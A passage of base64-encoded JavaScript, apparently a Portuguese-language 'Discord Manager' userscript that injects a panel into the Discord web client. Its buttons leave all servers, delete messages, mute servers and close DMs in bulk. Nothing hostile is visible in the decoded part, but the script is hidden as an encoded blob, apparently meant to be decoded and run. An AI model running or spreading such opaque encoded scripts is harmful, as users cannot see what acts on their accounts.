jdGVkLmxlbmd0aH0gc2Vydmlkb3JlcyFgLCBjYW5jZWxTdGF0ZS5jYW5jZWxsZWQgPyAid2FybmluZyIgOiAic3VjY2VzcyIpOwogICAgICAgICAgICB9KTsKICAgICAgICB9OwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibGVhdmUtYWxsLXNlcnZlcnMiKS5vbmNsaWNrID0gYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBhbGxTZXJ2ZXJzID0gQXJyYXkuZnJvbShjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5kZm0tc2VydmVyIikpOwogICAgICAgICAgICBpZiAoIWFsbFNlcnZlcnMubGVuZ3RoKSB7IHNob3dOb3RpZmljYXRpb24oIk5lbmh1bSBzZXJ2aWRvciBwYXJhIHNhaXIhIiwgIndhcm5pbmciKTsgcmV0dXJuOyB9CgogICAgICAgICAgICBzaG93Q29uZmlybU1vZGFsKGBBVEVOw4fDg08hIFNhaXIgZGUgVE9ET1Mgb3MgJHthbGxTZXJ2ZXJzLmxlbmd0aH0gc2Vydmlkb3Jlcz88YnI+PGJyPkVzdGEgYcOnw6NvIG7Do28gcG9kZSBzZXIgZGVzZmVpdGEhYCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc3QgeyBtb2RhbDogcHJvZ3Jlc3NNb2RhbCwgc3RhdGU6IGNhbmNlbFN0YXRlIH0gPSBjcmVhdGVQcm9ncmVzc01vZGFsKCJTYWluZG8gZGUgU2Vydmlkb3JlcyIsIGFsbFNlcnZlcnMubGVuZ3RoKTsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CiAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNwcm9ncmVzcy10ZXh0Iik7CiAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI3Byb2dyZXNzLWJhciIpOwogICAgICAgICAgICAgICAgbGV0IGxlZnRDb3VudCA9IDA7CgogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhbGxTZXJ2ZXJzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZWwgPSBhbGxTZXJ2ZXJzW2ldOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IGxlYXZlU2VydmVyKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5pY29uKTsKICAgICAgICAgICAgICAgICAgICBlbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgICAgICBsZWZ0Q291bnQrKzsKICAgICAgICAgICAgICAgICAgICB1cGRhdGVQcm9ncmVzcyhwcm9ncmVzc1RleHQsIHByb2dyZXNzQmFyLCBpICsgMSwgYWxsU2VydmVycy5sZW5ndGgsICJTYWluZG8gZGUiKTsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWVzdERlbGF5KSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIHsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKGBDYW5jZWxhZG8hIFNhaXUgZGUgJHtsZWZ0Q291bnR9IHNlcnZpZG9yZXMuYCwgIndhcm5pbmciKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImRmbS1zZWFyY2giIGlkPSJzZXJ2ZXJzLXNlYXJjaCIgcGxhY2Vob2xkZXI9IkJ1c2NhciBzZXJ2aWRvcmVzLi4uIj48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWVtcHR5Ij5OZW5odW0gc2Vydmlkb3I8L2Rpdj4KICAgICAgICAgICAgICAgICAgICBgOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oIlNhaXUgZGUgdG9kb3Mgb3Mgc2Vydmlkb3JlcyEiLCAic3VjY2VzcyIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9OwogICAgfTsKCiAgICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGNvbnRhaW5lci5pZCA9ICJkaXNjb3JkLWZyaWVuZC1tYW5hZ2VyIjsKICAgIGNvbnRhaW5lci5pbm5lckhUTUwgPSBgCiAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWhlYWRlciI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS10aXRsZSI+RGlzY29yZCBNYW5hZ2VyPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1jb250cm9scyI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuLWljb24iIGlkPSJkZm0tc2V0dGluZ3MiIHRpdGxlPSJDb25maWd1cmHDp8O1ZXMiPuKamTwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1pY29uIiBpZD0iZGZtLW1pbmltaXplIiB0aXRsZT0iTWluaW1pemFyIj7iiJI8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXRhYnMiPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tdGFiIGFjdGl2ZSIgZGF0YS10YWI9ImZyaWVuZHMiPlVzdcOhcmlvczwvYnV0dG9uPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tdGFiIiBkYXRhLXRhYj0ic2VydmVycyI+U2Vydmlkb3JlczwvYnV0dG9uPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tdGFiIiBkYXRhLXRhYj0iYWR2YW5jZWQiPkF2YW7Dp2FkbzwvYnV0dG9uPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImRmbS1jb250ZW50Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXRhYi1jb250ZW50IGFjdGl2ZSIgaWQ9ImZyaWVuZHMtdGFiIj48ZGl2IGNsYXNzPSJkZm0tbG9hZGluZyI+Q2FycmVnYW5kbyBhbWlnb3M8L2Rpdj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXRhYi1jb250ZW50IiBpZD0ic2VydmVycy10YWIiPjxkaXYgY2xhc3M9ImRmbS1sb2FkaW5nIj5DYXJyZWdhbmRvIHNlcnZpZG9yZXM8L2Rpdj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXRhYi1jb250ZW50IiBpZD0iYWR2YW5jZWQtdGFiIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1hZHZhbmNlZC1zZWN0aW9uIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VjdGlvbi10aXRsZSI+RGVsZXRhciBNZW5zYWdlbnMgcG9yIElEPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlY3Rpb24tZGVzY3JpcHRpb24iPkRlbGV0ZSBzdWFzIG1lbnNhZ2VucyBkZSB1bWEgY29udmVyc2EgdXNhbmRvIG8gSUQgZG8gdXN1w6FyaW8gKGZ1bmNpb25hIG1lc21vIHF1ZSBuw6NvIHNlamEgbWFpcyBhbWlnbyk8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taW5wdXQtZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImRmbS1pbnB1dCIgaWQ9ImRlbGV0ZS1tc2dzLXVzZXItaWQiIHBsYWNlaG9sZGVyPSJJRCBkbyB1c3XDoXJpbyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4iIGlkPSJkZWxldGUtbXNncy1ieS1pZCI+RGVsZXRhciBNZW5zYWdlbnM8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWFkdmFuY2VkLXNlY3Rpb24iPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWN0aW9uLXRpdGxlIj5TaWxlbmNpYXIgVG9kb3Mgb3MgU2Vydmlkb3JlczwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWN0aW9uLWRlc2NyaXB0aW9uIj5TaWxlbmNpYSBhcyBub3RpZmljYcOnw7VlcyBkZSB0b2RvcyBvcyBzZXJ2aWRvcmVzIHF1ZSB2b2PDqiBwYXJ0aWNpcGEuIFZvY8OqIGFpbmRhIHBvZGVyw6EgdmVyIGFzIG1lbnNhZ2VucywgbWFzIG7Do28gcmVjZWJlcsOhIG5vdGlmaWNhw6fDtWVzLjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4gd2FybmluZyIgaWQ9Im11dGUtYWxsLXNlcnZlcnMiPlNpbGVuY2lhciBUb2RvcyBvcyBTZXJ2aWRvcmVzPC9idXR0b24+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1hZHZhbmNlZC1zZWN0aW9uIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VjdGlvbi10aXRsZSI+RmVjaGFyIFRvZGFzIGFzIERNczwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWN0aW9uLWRlc2NyaXB0aW9uIj5GZWNoYSB0b2RhcyBhcyBjb252ZXJzYXMgcHJpdmFkYXMgYWJlcnRhcy4gSXNzbyBuw6NvIGFwYWdhIGFzIG1lbnNhZ2VucywgYXBlbmFzIGZlY2hhIG9zIGNhbmFpcyBkZSBETS48L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIGRhbmdlciIgaWQ9ImNsb3NlLWFsbC1kbXMiPkZlY2hhciBUb2RhcyBhcyBETXM8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIGA7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CgogICAgY29uc3Qgb3Blbk1hbmFnZXIgPSAoKSA9PiB7CiAgICAgICAgaWYgKGlzQW5pbWF0aW5nIHx8IGlzTWFuYWdlck9wZW4pIHJldHVybjsKICAgICAgICBpc0FuaW1hdGluZyA9IHRydWU7CiAgICAgICAgaXNNYW5hZ2VyT3BlbiA9IHRydWU7CiAgICAgICAgY29uc3QgY29udGFpbmVyV2lkdGggPSBNYXRoLm1pbig3MDAsIHdpbmRvdy5pbm5lcldpZHRoIC0gNDApOwogICAgICAgIGNvbnN0IGNvbnRhaW5lckhlaWdodCA9IE1hdGgubWluKDYwMCwgd2luZG93LmlubmVySGVpZ2h0IC0gNDApOwogICAgICAgIGNvbnRhaW5lci5zdHlsZS5sZWZ0ID0gYCR7KHdpbmRvdy5pbm5lcldpZHRoIC0gY29udGFpbmVyV2lkdGgpIC8gMn1weGA7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLnRvcCA9IGAkeyh3aW5kb3cuaW5uZXJIZWlnaHQgLSBjb250YWluZXJIZWlnaHQpIC8gMn1weGA7CiAgICAgICAgY29udGFpbmVyLnN0eWxlLnRyYW5zZm9ybSA9ICJub25lIjsKICAgICAgICBjb250YWluZXIuY2xhc3NMaXN0LnJlbW92ZSgiY2xvc2luZyIpOwogICAgICAgIGNvbnRhaW5lci5jbGFzc0xpc3QuYWRkKCJ2aXNpYmxlIik7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7IGlzQW5pbWF0aW5nID0gZmFsc2U7IH0sIDI1MCk7CiAgICB9OwoKICAgIGNvbnN0IGNsb3NlTWFuYWdlciA9ICgpID0+IHsKICAgICAgICBpZiAoaXNBbmltYXRpbmcgfHwgIWlzTWFuYWdlck9wZW4pIHJldHVybjsKICAgICAgICBpc0FuaW1hdGluZyA9IHRydWU7CiAgICAgICAgY29udGFpbmVyLmNsYXNzTGlzdC5yZW1vdmUoInZpc2libGUiKTsKICAgICAgICBjb250YWluZXIuY2xhc3NMaXN0LmFkZCgiY2xvc2luZyIpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4geyBjb250YWluZXIuY2xhc3NMaXN0LnJlbW92ZSgiY2xvc2luZyIpOyBpc01hbmFnZXJPcGVuID0gZmFsc2U7IGlzQW5pbWF0aW5nID0gZmFsc2U7IH0sIDI1MCk7CiAgICB9OwoKICAgIGNvbnN0IGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uID0gKCkgPT4gewogICAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGlzY29yZC1tYW5hZ2VyLW5hdi1idXR0b24iKSkgcmV0dXJuIHRydWU7CiAgICAgICAgY29uc3QgcXVlc3RzQ29udGFpbmVyID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignW2RhdGEtbGlzdC1pdGVtLWlkKj0icXVlc3RzIl0nKTsKICAgICAgICBpZiAoIXF1ZXN0c0NvbnRhaW5lcikgcmV0dXJuIGZhbHNlOwogICAgICAgIGNvbnN0IHF1ZXN0c0xpc3RJdGVtID0gcXVlc3RzQ29udGFpbmVyLmNsb3Nlc3QoImxpIik7CiAgICAgICAgaWYgKCFxdWVzdHNMaXN0SXRlbT8ucGFyZW50Tm9kZSkgcmV0dXJuIGZhbHNlOwoKICAgICAgICBjb25zdCBtYW5hZ2VyQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGkiKTsKICAgICAgICBtYW5hZ2VyQnV0dG9uLmlkID0gImRpc2NvcmQtbWFuYWdlci1uYXYtYnV0dG9uIjsKICAgICAgICBtYW5hZ2VyQnV0dG9uLmNsYXNzTmFtZSA9ICJfOTcyYTBkMjJjOGFmYTdmMC1jaGFubmVsIGU0NTg1OWQ2MDc5OWFkN2MtY29udGFpbmVyIjsKICAgICAgICBtYW5hZ2VyQnV0dG9uLnNldEF0dHJpYnV0ZSgicm9sZSIsICJsaXN0aXRlbSIpOwogICAgICAgIG1hbmFnZXJCdXR0b24uaW5uZXJIVE1MID0gYAogICAgICAgICAgICA8ZGl2IGNsYXNzPSJiZjIwMmQ2M2FkNTNlMjg5LWludGVyYWN0aXZlIF85NzJhMGQyMmM4YWZhN2YwLWludGVyYWN0aXZlIF85NzJhMGQyMmM4YWZhN2YwLWxpbmtCdXR0b24iPgogICAgICAgICAgICAgICAgPGEgY2xhc3M9Il85NzJhMGQyMmM4YWZhN2YwLWxpbmsiIGRhdGEtbGlzdC1pdGVtLWlkPSJwcml2YXRlLWNoYW5uZWxzLXVpZF8zMF9fX2Rpc2NvcmRfbWFuYWdlciIgdGFiaW5kZXg9Ii0xIiBocmVmPSIjIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMjBhNTM4NDZmZTJlODUxMy1sYXlvdXQgXzk3MmEwZDIyYzhhZmE3ZjAtYXZhdGFyV2l0aFRleHQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMjBhNTM4NDZmZTJlODUxMy1hdmF0YXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyBjbGFzcz0iXzk3MmEwZDIyYzhhZmE3ZjAtbGlua0J1dHRvbkljb24iIGFyaWEtaGlkZGVuPSJ0cnVlIiByb2xlPSJpbWciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjIwIiBoZWlnaHQ9IjIwIiBmaWxsPSJub25lIiB2aWV3Qm94PSIwIDAgMjQgMjQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwYXRoIGZpbGw9ImN1cnJlbnRDb2xvciIgZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0xIDE3LjkzYy0zLjk1LS40OS03LTMuODUtNy03LjkzIDAtLjYyLjA4LTEuMjEuMjEtMS43OUw5IDE1djFjMCAxLjEuOSAyIDIgMnYxLjkzem02LjktMi41NGMtLjI2LS44MS0xLTEuMzktMS45LTEuMzloLTF2LTNjMC0uNTUtLjQ1LTEtMS0xSDh2LTJoMmMuNTUgMCAxLS40NSAxLTFWN2gyYzEuMSAwIDItLjkgMi0ydi0uNDFjMi45MyAxLjE5IDUgNC4wNiA1IDcuNDEgMCAyLjA4LS44IDMuOTctMi4xIDUuMzl6Ii8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8yMGE1Mzg0NmZlMmU4NTEzLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzIwYTUzODQ2ZmUyZTg1MTMtbmFtZUFuZERlY29yYXRvcnMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8yMGE1Mzg0NmZlMmU4NTEzLWxlZnROYW1lIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzIwYTUzODQ2ZmUyZTg1MTMtbmFtZSI+RGlzY29yZCBNYW5hZ2VyPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIGA7CiAgICAgICAgcXVlc3RzTGlzdEl0ZW0ucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUobWFuYWdlckJ1dHRvbiwgcXVlc3RzTGlzdEl0ZW0ubmV4dFNpYmxpbmcpOwogICAgICAgIG1hbmFnZXJCdXR0b24ucXVlcnlTZWxlY3RvcigiYSIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZSA9PiB7IGUucHJldmVudERlZmF1bHQoKTsgZS5zdG9wUHJvcGFnYXRpb24oKTsgb3Blbk1hbmFnZXIoKTsgfSk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9OwoKICAgIGNvbnN0IGhlYWRlciA9IGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yKCIuZGZtLWhlYWRlciIpOwogICAgaGVhZGVyLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZG93biIsIGUgPT4gewogICAgICAgIGlmIChlLnRhcmdldC5jbG9zZXN0KCIuZGZtLWJ0bi1pY29uIikpIHJldHVybjsKICAgICAgICBpc0RyYWdnaW5nID0gdHJ1ZTsKICAgICAgICBjb25zdCByZWN0ID0gY29udGFpbmVyLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpOwogICAgICAgIG9mZnNldFggPSBlLmNsaWVudFggLSByZWN0LmxlZnQ7CiAgICAgICAgb2Zmc2V0WSA9IGUuY2xpZW50WSAtIHJlY3QudG9wOwogICAgICAgIGNvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm5vbmUiOwogICAgICAgIGNvbnRhaW5lci5zdHlsZS50cmFuc2Zvcm0gPSAibm9uZSI7CiAgICB9KTsKCiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW1vdmUiLCBlID0+IHsKICAgICAgICBpZiAoIWlzRHJhZ2dpbmcpIHJldHVybjsKICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgY29uc3QgbWF4WCA9IHdpbmRvdy5pbm5lcldpZHRoIC0gY29udGFpbmVyLm9mZnNldFdpZHRoOwogICAgICAgIGNvbnN0IG1heFkgPSB3aW5kb3cuaW5uZXJIZWlnaHQgLSBjb250YWluZXIub2Zmc2V0SGVpZ2h0OwogICAgICAgIGNvbnRhaW5lci5zdHlsZS5sZWZ0ID0gYCR7TWF0aC5tYXgoMCwgTWF0aC5taW4obWF4WCwgZS5jbGllbnRYIC0gb2Zmc2V0WCkpfXB4YDsKICAgICAgICBjb250YWluZXIuc3R5bGUudG9wID0gYCR7TWF0aC5tYXgoMCwgTWF0aC5taW4obWF4WSwgZS5jbGllbnRZIC0gb2Zmc2V0WSkpfXB4YDsKICAgIH0pOwoKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNldXAiLCAoKSA9PiB7IGlmIChpc0RyYWdnaW5nKSB7IGlzRHJhZ2dpbmcgPSBmYWxzZTsgY29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAibm9uZSI7IH0gfSk7CgogICAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoInJlc2l6ZSIsICgpID0+IHsKICAgICAgICBpZiAoIWlzTWFuYWdlck9wZW4pIHJldHVybjsKICAgICAgICBjb25zdCByZWN0ID0gY29udGFpbmVyLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpOwogICAgICAgIGNvbnN0IG1heFggPSB3aW5kb3cuaW5uZXJXaWR0aCAtIHJlY3Qud2lkdGg7CiAgICAgICAgY29uc3QgbWF4WSA9IHdpbmRvdy5pbm5lckhlaWdodCAtIHJlY3QuaGVpZ2h0OwogICAgICAgIGlmIChyZWN0LmxlZnQgPiBtYXhYKSBjb250YWluZXIuc3R5bGUubGVmdCA9IGAke01hdGgubWF4KDAsIG1heFgpfXB4YDsKICAgICAgICBpZiAocmVjdC50b3AgPiBtYXhZKSBjb250YWluZXIuc3R5bGUudG9wID0gYCR7TWF0aC5tYXgoMCwgbWF4WSl9cHhgOwogICAgfSk7CgogICAgY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3IoIiNkZm0tc2V0dGluZ3MiKS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGUgPT4geyBlLnByZXZlbnREZWZhdWx0KCk7IGUuc3RvcFByb3BhZ2F0aW9uKCk7IHNob3dTZXR0aW5nc01vZGFsKCk7IH0pOwogICAgY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3IoIiNkZm0tbWluaW1pemUiKS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGUgPT4geyBlLnByZXZlbnREZWZhdWx0KCk7IGUuc3RvcFByb3BhZ2F0aW9uKCk7IGNsb3NlTWFuYWdlcigpOyB9KTsKCiAgICBjb25zdCBkZWxldGVNc2dzQnlJZEJ0biA9IGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yKCIjZGVsZXRlLW1zZ3MtYnktaWQiKTsKICAgIGNvbnN0IGRlbGV0ZU1zZ3NJbnB1dCA9IGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yKCIjZGVsZXRlLW1zZ3MtdXNlci1pZCIpOwogICAgZGVsZXRlTXNnc0J5SWRCdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiBkZWxldGVNZXNzYWdlc0J5VXNlcklkKGRlbGV0ZU1zZ3NJbnB1dC52YWx1ZSkpOwogICAgZGVsZXRlTXNnc0lucHV0LmFkZEV2ZW50TGlzdGVuZXIoImtleXByZXNzIiwgZSA9PiB7IGlmIChlLmtleSA9PT0gIkVudGVyIikgZGVsZXRlTWVzc2FnZXNCeVVzZXJJZChkZWxldGVNc2dzSW5wdXQudmFsdWUpOyB9KTsKCiAgICBjb250YWluZXIucXVlcnlTZWxlY3RvcigiI211dGUtYWxsLXNlcnZlcnMiKS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IG11dGVBbGxTZXJ2ZXJzKCkpOwogICAgY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3IoIiNjbG9zZS1hbGwtZG1zIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiBjbG9zZUFsbERNcygpKTsKCiAgICBjb250YWluZXIucXVlcnlTZWxlY3RvckFsbCgiLmRmbS10YWIiKS5mb3JFYWNoKHRhYiA9PiB7CiAgICAgICAgdGFiLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gewogICAgICAgICAgICBjb250YWluZXIucXVlcnlTZWxlY3RvckFsbCgiLmRmbS10YWIiKS5mb3JFYWNoKHQgPT4gdC5jbGFzc0xpc3QucmVtb3ZlKCJhY3RpdmUiKSk7CiAgICAgICAgICAgIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCIuZGZtLXRhYi1jb250ZW50IikuZm9yRWFjaChjID0+IGMuY2xhc3NMaXN0LnJlbW92ZSgiYWN0aXZlIikpOwogICAgICAgICAgICB0YWIuY2xhc3NMaXN0LmFkZCgiYWN0aXZlIik7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGAke3RhYi5kYXRhc2V0LnRhYn0tdGFiYCkuY2xhc3NMaXN0LmFkZCgiYWN0aXZlIik7CiAgICAgICAgfSk7CiAgICB9KTsKCiAgICBzZXRJbnRlcnZhbCgoKSA9PiB7IGlmICghZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRpc2NvcmQtbWFuYWdlci1uYXYtYnV0dG9uIikpIGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uKCk7IH0sIDIwMDApOwoKICAgIHRyeSB7CiAgICAgICAgY29uc3QgW2ZyaWVuZHNEYXRhLCBzZXJ2ZXJzRGF0YV0gPSBhd2FpdCBQcm9taXNlLmFsbChbZmV0Y2hGcmllbmRzKCksIGZldGNoU2VydmVycygpXSk7CiAgICAgICAgcmVuZGVyRnJpZW5kcyhmcmllbmRzRGF0YS5maWx0ZXIoZiA9PiBmLnR5cGUgPT09IDEpKTsKICAgICAgICByZW5kZXJTZXJ2ZXJzKHNlcnZlcnNEYXRhKTsKICAgIH0gY2F0Y2ggewogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmcmllbmRzLXRhYiIpLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiI+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+RXJybyBhbyBjYXJyZWdhciBhbWlnb3M8L2Rpdj4KICAgICAgICBgOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzZXJ2ZXJzLXRhYiIpLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9InNlcnZlcnMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIHNlcnZpZG9yZXMuLi4iPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPkVycm8gYW8gY2FycmVnYXIgc2Vydmlkb3JlczwvZGl2PgogICAgICAgIGA7CiAgICAgICAgc2hvd05vdGlmaWNhdGlvbigiRXJybyBhbyBjYXJyZWdhciBkYWRvcyIsICJlcnJvciIpOwogICAgfQoKICAgIGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uKCk7Cn0pKCk7");
